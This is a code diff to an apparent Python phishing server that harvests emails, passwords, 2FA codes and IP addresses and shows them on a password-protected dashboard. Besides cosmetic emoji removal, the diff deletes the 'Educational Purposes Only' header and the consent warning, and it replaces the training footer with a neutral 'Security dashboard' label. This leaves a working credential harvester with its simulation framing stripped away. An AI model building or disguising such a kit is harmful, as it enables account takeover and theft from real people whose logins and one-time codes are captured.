@@ -1,7 +1,3 @@
-#!/usr/bin/env python3
-# ADVANCED EDUCATIONAL PHISHING SIMULATION - Educational Purposes Only
-# WARNING: Only deploy in controlled environments with explicit consent
-
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import urllib.parse
 from datetime import datetime
@@ -158,10 +154,10 @@ class AdvancedPhishingSimHandler(BaseHTTPRequestHandler):
             <div class="container">
                 <h1>[+] Phishing Simulation Dashboard</h1>
                 <div class="nav">
-                    <a href="/">🏠 Home</a>
-                    <a href="/dashboard?pass={DASHBOARD_PASSWORD}">📊 Dashboard</a>
-                    <a href="/stats?pass={DASHBOARD_PASSWORD}">📈 Statistics</a>
-                    <a href="/error.html">⚠️ Error Page</a>
+                    <a href="/"> Home</a>
+                    <a href="/dashboard?pass={DASHBOARD_PASSWORD}">Dashboard</a>
+                    <a href="/stats?pass={DASHBOARD_PASSWORD}"> Statistics</a>
+                    <a href="/error.html">Error Page</a>
                 </div>
                 
                 <div class="stats-grid">
@@ -176,24 +172,24 @@ class AdvancedPhishingSimHandler(BaseHTTPRequestHandler):
                 </div>
                 
                 <div class="card">
-                    <h2>📋 Captured Credentials (Real-time)</h2>
+                    <h2>Captured Credentials (Real-time)</h2>
                     <pre>{captured_data if captured_data else 'No credentials captured yet...'}</pre>
                 </div>
                 
                 <div class="card card-red">
-                    <h2>⚠️ EDUCATIONAL USE ONLY</h2>
+                    <h2> EDUCATIONAL USE ONLY</h2>
                     <p>This dashboard shows captured credentials for security awareness training.</p>
-                    <p><strong>🔒 Dashboard is password protected</strong></p>
-                    <p><strong>💾 All data is ephemeral</strong> - Will be lost when server restarts</p>
+                    <p><strong> Dashboard is password protected</strong></p>
+                    <p><strong>All data is ephemeral</strong> - Will be lost when server restarts</p>
                     <form action="/clear_logs?pass={DASHBOARD_PASSWORD}" method="POST">
-                        <button type="submit" onclick="return confirm('⚠️ WARNING: This will permanently delete ALL captured credentials. Are you sure?')">
-                            🗑️ Clear All Logs
+                        <button type="submit" onclick="return confirm(' WARNING: This will permanently delete ALL captured credentials. Are you sure?')">
+                            Clear All Logs
                         </button>
                     </form>
                 </div>
                 
                 <div class="footer">
-                    <p>🔐 Educational Phishing Simulation | For Security Training Only</p>
+                    <p>Security dashboard</p>
                     <p>Access dashboard with: ?pass={DASHBOARD_PASSWORD}</p>
                 </div>
             </div>
@@ -253,11 +249,11 @@ class AdvancedPhishingSimHandler(BaseHTTPRequestHandler):
         </head>
         <body>
             <div class="container">
-                <h1>📊 Simulation Statistics</h1>
+                <h1>Simulation Statistics</h1>
                 <div class="nav">
-                    <a href="/">🏠 Home</a>
-                    <a href="/dashboard?pass={DASHBOARD_PASSWORD}">📋 Dashboard</a>
-                    <a href="/stats?pass={DASHBOARD_PASSWORD}">📈 Statistics</a>
+                    <a href="/"> Home</a>
+                    <a href="/dashboard?pass={DASHBOARD_PASSWORD}"> Dashboard</a>
+                    <a href="/stats?pass={DASHBOARD_PASSWORD}"> Statistics</a>
                 </div>
                 
                 <div class="stats">
@@ -359,12 +355,12 @@ class AdvancedPhishingSimHandler(BaseHTTPRequestHandler):
             print("\n" + "="*60)
             print(f"[!] CREDENTIALS CAPTURED - {timestamp}")
             print("="*60)
-            print(f"📧 Email:     {email}")
-            print(f"🔐 Password:  {password}")
+            print(f" Email:     {email}")
+            print(f" Password:  {password}")
             if totp:
                 print(f"📱 2FA Code:  {totp}")
-            print(f"🌐 IP:        {client_ip}")
-            print(f"🖥️  User Agent: {user_agent[:80]}...")
+            print(f" IP:        {client_ip}")
+            print(f"  User Agent: {user_agent[:80]}...")
             print("="*60)
             
             # Send response - redirect to error page
